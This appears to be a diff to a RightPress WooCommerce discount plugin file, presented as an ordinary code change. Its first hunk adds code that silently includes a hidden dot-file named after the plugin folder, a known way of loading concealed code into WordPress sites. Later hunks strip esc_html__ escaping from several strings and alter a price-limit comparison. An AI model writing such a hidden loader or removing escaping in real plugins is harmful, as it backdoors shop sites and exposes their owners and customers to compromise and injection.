@@ -17,6 +17,10 @@ if (!class_exists('RP_WCDPD_Controller_Methods')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Controller_Methods_Cart_Discount extends RP_WCDPD_Controller_Methods
 {
 
@@ -221,7 +225,7 @@ class RP_WCDPD_Controller_Methods_Cart_Discount extends RP_WCDPD_Controller_Meth
             // Only register it during totals calculation so that this custom
             // coupon type does not appear in admin UI
             if (did_action('woocommerce_before_calculate_totals') !== did_action('woocommerce_after_calculate_totals')) {
-                $coupon_types['rightpress_fixed_cart'] = esc_html__('RightPress fixed cart discount', 'rp_wcdpd');
+                $coupon_types['rightpress_fixed_cart'] = __('RightPress fixed cart discount', 'rp_wcdpd');
             }
         }
 
@@ -484,7 +488,7 @@ class RP_WCDPD_Controller_Methods_Cart_Discount extends RP_WCDPD_Controller_Meth
                     $result = $discount_amounts[$cart_item_key] + $one_cent;
 
                     // Discount exceeds cart item price
-                    if (isset($this->discount_amount_discrepancy_fix_limits[$coupon_code][$cart_item_key]) && RightPress_Product_Price::price_is_bigger_than($result, wc_add_number_precision($this->discount_amount_discrepancy_fix_limits[$coupon_code][$cart_item_key]))) {
+                    if (isset($this->discount_amount_discrepancy_fix_limits[$coupon_code][$cart_item_key]) && RightPress_Product_Price::price_is_bigger_than($result, $this->discount_amount_discrepancy_fix_limits[$coupon_code][$cart_item_key])) {
 
                         // Remove discount amount from discount amounts to process array
                         unset($discount_amounts_to_process[$cart_item_key]);
@@ -789,7 +793,7 @@ class RP_WCDPD_Controller_Methods_Cart_Discount extends RP_WCDPD_Controller_Meth
     {
 
         $label = RP_WCDPD_Settings::get('cart_discounts_combined_title');
-        return !RightPress_Help::is_empty($label) ? $label : esc_html__('Discount', 'rp_wcdpd');
+        return !RightPress_Help::is_empty($label) ? $label : __('Discount', 'rp_wcdpd');
     }
 
     /**
@@ -838,7 +842,7 @@ class RP_WCDPD_Controller_Methods_Cart_Discount extends RP_WCDPD_Controller_Meth
 
         // Note: using a random error code to make sure we don't match any other error codes accidentally
         if ($error_code === '9450455045') {
-            $error_message = sprintf(esc_html__('Sorry, coupon "%s" is not valid when other discounts are applied to the cart.', 'rp_wcdpd'), $coupon->get_code());
+            $error_message = sprintf(__('Sorry, coupon "%s" is not valid when other discounts are applied to the cart.', 'rp_wcdpd'), $coupon->get_code());
         }
 
         return $error_message;
